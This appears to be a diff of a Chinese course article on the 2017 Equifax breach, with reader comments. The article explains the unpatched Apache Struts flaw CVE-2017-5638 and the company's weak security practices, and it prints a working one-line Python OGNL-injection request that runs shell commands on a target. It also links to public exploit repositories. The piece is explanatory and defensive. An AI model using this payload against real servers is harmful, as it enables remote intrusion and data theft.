@@ -15,11 +15,68 @@ Equifax日前确认，黑客利用了其系统中未修复的Apache Struts漏洞
 根据《华尔街日报》（The Wall Street Journal）的观察，自Equifax在9月8日披露黑客进入该公司部分系统以来，全美联邦法院接到的诉讼已经超过百起。针对此次事件，Equifax首席执行官理查德·史密斯（Richard Smith）表示，公司正在对整体安全操作进行全面彻底的审查。
 
 事件发生之初，Equifax在声明中指出，黑客是利用了某个“U.S. website application”中的漏洞获取文件。后经调查，黑客是利用了Apache Struts的CVE-2017-5638漏洞。
-<div><strong>精选留言（30）</strong></div><ul>
-<li><img src="https://static001.geekbang.org/account/avatar/00/0f/7a/7b/ee2e9302.jpg" width="30px"><span>廖雪峰</span> 👍（275） 💬（16）<div>struts的开发就是弱者，类似eval()的东西默认就敢开</div>2017-10-26</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/0f/63/77/423345ab.jpg" width="30px"><span>Sdylan</span> 👍（119） 💬（0）<div>#Equifax信息泄露始末笔记
+
+戏剧性的是，该漏洞于今年3月份就已被披露，其危险系数定为最高分10分，Apache随后发布的Struts 2.3.32和2.5.10.1版本特针对此漏洞进行了修复。而Equifax在漏洞公布后的两个月内都没有升级Struts版本，导致5月份黑客利用这个漏洞进行攻击，泄露其敏感数据。
+
+事实上，除了Apache的漏洞，黑客还使用了一些其他手段绕过WAF（Web应用程序防火墙）。有些管理面板居然位于Shodan搜索引擎上。更让人大跌眼镜的是，据研究人员分析，Equifax所谓的“管理面板”都没有采取任何安保措施。安全专家布莱恩·克雷布斯（Brian Krebs）在其博客中爆料，Equifax的一个管理面板使用的用户名和密码都是“admin”。
+
+由于管理面板能被随意访问，获取数据库密码就轻而易举了——虽然管理面板会加密数据库密码之类的东西，但是密钥却和管理面板保存在了一起。虽然是如此重要的征信机构，但Equifax的安全意识之弱可见一斑。
+
+据悉，Equifax某阿根廷员工门户也泄露了14000条记录，包括员工凭证和消费者投诉。本次事件发生后，好事者列举了Equifax系统中的一系列漏洞，包括一年以前向公司报告的未修补的跨站脚本（XSS）漏洞，更将Equifax推向了风口浪尖。
+
+# Apache Struts漏洞相关
+
+Apache Struts是世界上最流行的Java Web服务器框架之一，它最初是Jakarta项目中的一个子项目，并在2004年3月成为Apache基金会的顶级项目。
+
+Struts通过采用Java Servlet/JSP技术，实现了基于Java EE Web应用的MVC设计模式的应用框架，也是当时第一个采用MVC模式的Web项目开发框架。随着技术的发展和认知的提升，Struts的设计者意识到Struts的一些缺陷，于是有了重新设计的想法。
+
+2006年，另外一个MVC框架WebWork的设计者与Struts团队一起开发了新一代的Struts框架，它整合了WebWork与Struts的优点，同时命名为“Struts 2”，原来的Struts框架改名为Struts 1。
+
+因为两个框架都有强大的用户基础，所以Struts 2一发布就迅速流行开来。在2013年4月，Apache Struts项目团队发布正式通知，宣告Struts 1.x开发框架结束其使命，并表示接下来官方将不会继续提供支持。自此Apache Struts 1框架正式退出历史舞台。
+
+同期，Struts社区表示他们将专注于推动Struts 2框架的发展。从这几年的版本发布情况来看，Struts 2的迭代速度确实不慢，仅仅在2017年就发布了9个版本，平均一个月一个。
+
+但从安全角度来看，Struts 2可谓是漏洞百出，因为框架的功能基本已经健全，所以这些年Struts 2的更新和迭代基本也是围绕漏洞和Bug进行修复。仅从官方披露的安全公告中就可以看到，这些年就有53个漏洞预警，包括大家熟知的远程代码执行高危漏洞。
+
+根据网络上一份未被确认的数据显示，中国的Struts应用分布在全球范围内排名第一，第二是美国，然后是日本，而中国没有打补丁的Struts的数量几乎是其他国家的总和。特别是在浙江、北京、广东、山东、四川等地，涉及教育、金融、互联网、通信等行业。
+
+所以在今年7月，国家信息安全漏洞共享平台还发布过关于做好Apache Struts 2高危漏洞管理和应急工作的安全公告，大致意思是希望企业能够加强学习，提高安全认识，同时完善相关流程，协同自律。
+
+而这次Equifax中招的漏洞编号是CVE-2017-5638，官方披露的信息见下图。简单来说，这是一个RCE的远程代码执行漏洞，最初是被安恒信息的Nike Zheng发现的，并于3月7日上报。
+
+![](https://static001.geekbang.org/resource/image/00/cc/009ecfbac5741ea7ffd7fa3079a8c8cc.png?wh=1600%2A889)
+
+从介绍中可以看出，此次漏洞的原因是Apache Struts 2的Jakarta Multipart parser插件存在远程代码执行漏洞，攻击者可以在使用该插件上传文件时，修改HTTP请求头中的Content-Type值来触发漏洞，最后远程执行代码。
+
+说白了，就是在Content-Type注入OGNL语言，进而执行命令。代码如下（一行Python命令就可以执行服务器上的shell命令）：
+
+```
+import requests
+requests.get("https://target", headers={"Connection": "close", "Accept": "*/*", "User-Agent": "Mozilla/5.0", "Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='dir').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"})
+```
+
+在GitHub上有相关的代码，链接为：[https://github.com/mazen160/struts-pwn](https://github.com/mazen160/struts-pwn) 或 [https://github.com/xsscx/cve-2017-5638](https://github.com/xsscx/cve-2017-5638)
+
+注入点是在JakartaMultiPartRequest.java的buildErrorMessage函数中，这个函数里的localizedTextUtil.findText会执行OGNL表达式，从而导致命令执行（注：可以参看Struts 两个版本的补丁“2.5.10.1版补丁”“2.3.32版补丁”），使客户受到影响。
+
+因为默认情况下Jakarta是启用的，所以该漏洞的影响范围甚广。当时官方给出的解决方案是尽快升级到不受影响的版本，看来Equifax的同学并没有注意到，或者也没有认识到它的严重性。
+
+另外，在9月5日和7日，Struts官方又接连发布了几个严重级别的安全漏洞公告，分别是CVE-2017-9804、CVE-2017-9805、CVE-2017-9793和CVE-2017-12611。
+
+这里面最容易被利用的当属CVE-2017-9805，它是由国外安全研究组织lgtm.com的安全研究人员发现的又一个远程代码执行漏洞。漏洞原因是Struts 2 REST插件使用带有XStream程序的XStream Handler 进行未经任何代码过滤的反序列化操作，所以在反序列化XML payloads时就可能导致远程代码执行。
+
+![](https://static001.geekbang.org/resource/image/f8/02/f8a10b42faf789018e0a5dfadbbd0c02.png?wh=1600%2A591)
+
+不过在Apache软件基金会的项目管理委员会的回应文章中，官方也对事故原因进行了分析和讨论。首先，依然不能确定泄露的源头是Struts的漏洞导致的。其次，如果确实是源于Struts的漏洞，那么原因“或是Equifax服务器未打补丁，使得一些更早期公布的漏洞被攻击者利用，或者是攻击者利用了一个目前尚未被发现的漏洞”。
+
+根据推测，该声明提出黑客所使用的软件漏洞可能就是CVE-2017-9805漏洞，该漏洞虽然是在9月4日才由官方正式公布，但早在7月时就有人公布在网络上了，并且这个漏洞的存在已有9年。
+
+相信通过今天的分享，你一定对Equifax的数据泄露始末及造成原因有了清楚的了解。欢迎把你的收获和想法，分享给我。下节课中，我们将回顾一下互联网时代的其他大规模数据泄露事件，并结合这些事件给出应对方案和技术手段。
+<div><strong>精选留言（15）</strong></div><ul>
+<li><span>廖雪峰</span> 👍（275） 💬（16）<div>struts的开发就是弱者，类似eval()的东西默认就敢开</div>2017-10-26</li><br/><li><span>Sdylan</span> 👍（119） 💬（0）<div>#Equifax信息泄露始末笔记
 1.使用开源的框架必须实时关注其动态，特别是安全漏洞方面
 2.任何公开的入口，都必须进行严格的安全检查
-3.框架的选型十分重要，必须将安全考察进去</div>2018-06-01</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/0f/65/d5/88beb15a.jpg" width="30px"><span>李志博</span> 👍（61） 💬（0）<div>Struts 漏洞那么多，最好的办法就是赶快切换spring mvc</div>2017-10-20</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/0f/44/47/3ddb94d0.jpg" width="30px"><span>javaadu</span> 👍（33） 💬（5）<div>使用开源框架，千万要注意其BUG和安全性，去年我们发现fastjson有个安全问题，整个公司在一个星期内都紧急检查和升级。现在github做得很好的一点是，会对我们的代码进行安全扫描，发现有包含安全性问题的版本的代码的时候，会给出升级提醒，在大一点的公司里也可以自己做这种安全扫描和提醒。</div>2018-11-17</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/0f/8e/c4/8d1150f3.jpg" width="30px"><span>Richie</span> 👍（19） 💬（0）<div>事件：
+3.框架的选型十分重要，必须将安全考察进去</div>2018-06-01</li><br/><li><span>李志博</span> 👍（61） 💬（0）<div>Struts 漏洞那么多，最好的办法就是赶快切换spring mvc</div>2017-10-20</li><br/><li><span>javaadu</span> 👍（33） 💬（5）<div>使用开源框架，千万要注意其BUG和安全性，去年我们发现fastjson有个安全问题，整个公司在一个星期内都紧急检查和升级。现在github做得很好的一点是，会对我们的代码进行安全扫描，发现有包含安全性问题的版本的代码的时候，会给出升级提醒，在大一点的公司里也可以自己做这种安全扫描和提醒。</div>2018-11-17</li><br/><li><span>Richie</span> 👍（19） 💬（0）<div>事件：
 大规模数据泄露
 
 主角：
@@ -32,13 +89,10 @@ Equifax —— 美国三大信用报告公司中历史最悠久的一家，其�
 在Struts高危漏洞披露后两个月仍没有升级版本及修复漏洞，导致被黑客利用。
 
 根本原因：
-Equifax 的安全意识太弱（还有很多其他未修复的漏洞）</div>2020-02-11</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/10/b8/3c/1a294619.jpg" width="30px"><span>Panda</span> 👍（18） 💬（0）<div>换spring-boot😈</div>2018-04-25</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/11/64/04/18875529.jpg" width="30px"><span>艾尔欧唯伊</span> 👍（13） 💬（5）<div>很好奇，这些大牛是怎么注意到这些安全漏洞的。。。</div>2018-08-31</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/11/a2/16/4c5de4fb.jpg" width="30px"><span>月伴寒江</span> 👍（12） 💬（0）<div>struts漏洞实在太多，补都补不赢，之前的项目后来都换成了Spring MVC。对于一些安全意识不高的企业，确实没什么人关注这些。</div>2018-06-14</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/11/85/8a/031a6fd8.jpg" width="30px"><span>风起</span> 👍（12） 💬（0）<div>作为一个新员工，终于明白公司为什么有一个团队专门坐开源组建扫描评级， 还有为啥有代码安全扫描。</div>2018-06-11</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/0f/52/97/4593cda8.jpg" width="30px"><span>MC</span> 👍（11） 💬（0）<div>哎，我的信息也在其中…</div>2017-10-17</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/0f/65/af/e6bf880d.jpg" width="30px"><span>yaoel</span> 👍（7） 💬（0）<div>有时项目因为赶进度，会决定先上线再加强安全问题！但经常就直接搁置了...虽然当时省了一些力，却可能（一定）在n年会付出惨痛的代价！所以安全问题不容忽视</div>2017-10-22</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/1c/f8/df/3171db9f.jpg" width="30px"><span>Lorem</span> 👍（6） 💬（0）<div>课代表来了
+Equifax 的安全意识太弱（还有很多其他未修复的漏洞）</div>2020-02-11</li><br/><li><span>Panda</span> 👍（18） 💬（0）<div>换spring-boot😈</div>2018-04-25</li><br/><li><span>艾尔欧唯伊</span> 👍（13） 💬（5）<div>很好奇，这些大牛是怎么注意到这些安全漏洞的。。。</div>2018-08-31</li><br/><li><span>月伴寒江</span> 👍（12） 💬（0）<div>struts漏洞实在太多，补都补不赢，之前的项目后来都换成了Spring MVC。对于一些安全意识不高的企业，确实没什么人关注这些。</div>2018-06-14</li><br/><li><span>风起</span> 👍（12） 💬（0）<div>作为一个新员工，终于明白公司为什么有一个团队专门坐开源组建扫描评级， 还有为啥有代码安全扫描。</div>2018-06-11</li><br/><li><span>MC</span> 👍（11） 💬（0）<div>哎，我的信息也在其中…</div>2017-10-17</li><br/><li><span>yaoel</span> 👍（7） 💬（0）<div>有时项目因为赶进度，会决定先上线再加强安全问题！但经常就直接搁置了...虽然当时省了一些力，却可能（一定）在n年会付出惨痛的代价！所以安全问题不容忽视</div>2017-10-22</li><br/><li><span>Lorem</span> 👍（6） 💬（0）<div>课代表来了
 笔记03
 
 1.使用开源的框架必须实时关注其动态，特别是安全漏洞方面
 2.任何公开的入口，都必须进行严格的安全检查
-3.框架的选型十分重要，必须将安全考察进去</div>2020-04-22</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/10/38/b7/b5dba54d.jpg" width="30px"><span>iDev_周晶</span> 👍（6） 💬（0）<div>没想到 Struts2 现在还有那么大的份额</div>2018-03-10</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/10/9e/d3/abb7bfe3.jpg" width="30px"><span>wholly</span> 👍（5） 💬（0）<div>使用开源软件，一方面需要及时关注开源社区发布的安全预警及版本迭代时的changelog，另一方面，如果使用过程发现问题，及时向开源反馈，做到使用开源，回馈开源。</div>2019-08-09</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/11/74/53/54fb0b05.jpg" width="30px"><span>渡鹤影</span> 👍（5） 💬（0）<div>今天网传12306信息也泄露了……</div>2018-06-13</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/0f/df/6c/5af32271.jpg" width="30px"><span>Dylan</span> 👍（5） 💬（0）<div>吸取教训了～安全意识不管是大公司或者像我现在自己创业的项目，对于安全总是想得很侥幸，但是一旦爆发出来可能就对公司产生致命影响了</div>2018-01-07</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/13/24/4d/29a93491.jpg" width="30px"><span>niuniu</span> 👍（4） 💬（0）<div>两个critical的漏洞都是华人上报的</div>2019-09-06</li><br/><li><img src="http://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTLAHCRt6dBUDTFX4EotyV5NDbYiaUXH109SOdRprLky1PUc9jm2K7QvoCpkZuCyqMCNSogUpdFzMJw/132" width="30px"><span>Geek_ce6971</span> 👍（2） 💬（0）<div>log4j JNDI 漏洞引起的动静也不小</div>2021-12-28</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/13/b1/81/13f23d1e.jpg" width="30px"><span>方勇(gopher)</span> 👍（2） 💬（0）<div>安全意识薄弱是大部分工程师的通病，业务开发主要关注于增删改查！公司整体安全意识薄弱，依赖中间件未深入研究关注，只是停留在基本使用上！提高自己的认知，提高公司的整体意识非常重要！</div>2021-09-28</li><br/><li><img src="" width="30px"><span>Fallon</span> 👍（2） 💬（0）<div>从Equifax的事件，我想到另外一个问题，一个企业该如何做好漏洞管理。不只是软件包存在漏洞，OS也存在漏洞，大部分漏洞都是通过补丁进行修复的。你使用的软件包越多，OS越多，修复的频率就会非常高，不是在打补丁，就是在打补丁的路上，对于架构设计不合理的应用，更有可能需要停机另外补丁修复，成本非常高。那么漏洞应该怎么管理呢？欢迎大家来聊聊</div>2020-09-17</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/10/85/db/f978ddcd.jpg" width="30px"><span>BeginYan</span> 👍（2） 💬（0）<div>发现java开发的项目的漏洞貌似比其他语言比如Python要多。。</div>2020-04-22</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/37/51/94/7f2357dd.jpg" width="30px"><span>苏非辞</span> 👍（1） 💬（0）<div>看不懂咋整😭😭</div>2023-07-06</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/28/23/18/4284361f.jpg" width="30px"><span>易飞</span> 👍（1） 💬（0）<div>能发现漏洞的都是大佬</div>2021-11-16</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/10/4c/3b/47d832f4.jpg" width="30px"><span>书豪</span> 👍（1） 💬（0）<div>前期不注重，后期懒得管，丢下的隐患，迟早要暴露</div>2020-04-22</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/10/1b/03/4d5c017f.jpg" width="30px"><span>艺漫漫</span> 👍（1） 💬（0）<div>最近出了一个微信数据结构和加密算法被吕某用反编译手段破了 这也是安全事故了吧。看来程序员在写代码或用算法是都需要考虑这些安全问题了</div>2020-03-22</li><br/><li><img src="http://thirdwx.qlogo.cn/mmopen/vi_32/qc4pasMqznVJfdcpltOEbwVHH5zF1NUvKYuIzWvQMqxHEPUH6QpF8VDm0XNkaWwvHSWhEYTNCY3yNgCJSQQAvw/132" width="30px"><span>孙剑平</span> 👍（1） 💬（0）<div>现在大公司都特别重视安全，敏感文字都需要打码</div>2020-03-16</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/0f/44/47/3ddb94d0.jpg" width="30px"><span>javaadu</span> 👍（1） 💬（1）<div>安全意识为零，再多的漏洞也补不过来</div>2018-11-12</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/0f/dc/68/006ba72c.jpg" width="30px"><span>Untitled</span> 👍（1） 💬（0）<div>怎么才能有加强自己对互联网各个方面都有所见解？像我这种只会使用一些编程语言，可惜专业也不是IT方面的，真希望有天能站在一个高度上看待问题，现在在恶补网络知识，后面想从这个点开始扩展自己的视野</div>2018-11-05</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/11/9e/6e/c4fa7cbc.jpg" width="30px"><span>二师哥</span> 👍（1） 💬（0）<div>安全无小事，
-但是创业公司，更关注的项目落地和功能实现。这个就很难办？
-作为大企业，安全意识这么差就不能理解了。
-我想问下，创业公司，团队就几号人物，如何在安全上有所防范，是不是就应该先做功能开发，上线了再说！</div>2018-06-14</li><br/><li><img src="https://static001.geekbang.org/account/avatar/00/0f/ab/10/b812ff3e.jpg" width="30px"><span>Hesher</span> 👍（1） 💬（0）<div>Spring MVC 借机上位</div>2018-04-26</li><br/>
+3.框架的选型十分重要，必须将安全考察进去</div>2020-04-22</li><br/><li><span>iDev_周晶</span> 👍（6） 💬（0）<div>没想到 Struts2 现在还有那么大的份额</div>2018-03-10</li><br/><li><span>wholly</span> 👍（5） 💬（0）<div>使用开源软件，一方面需要及时关注开源社区发布的安全预警及版本迭代时的changelog，另一方面，如果使用过程发现问题，及时向开源反馈，做到使用开源，回馈开源。</div>2019-08-09</li><br/><li><span>渡鹤影</span> 👍（5） 💬（0）<div>今天网传12306信息也泄露了……</div>2018-06-13</li><br/>
 </ul>
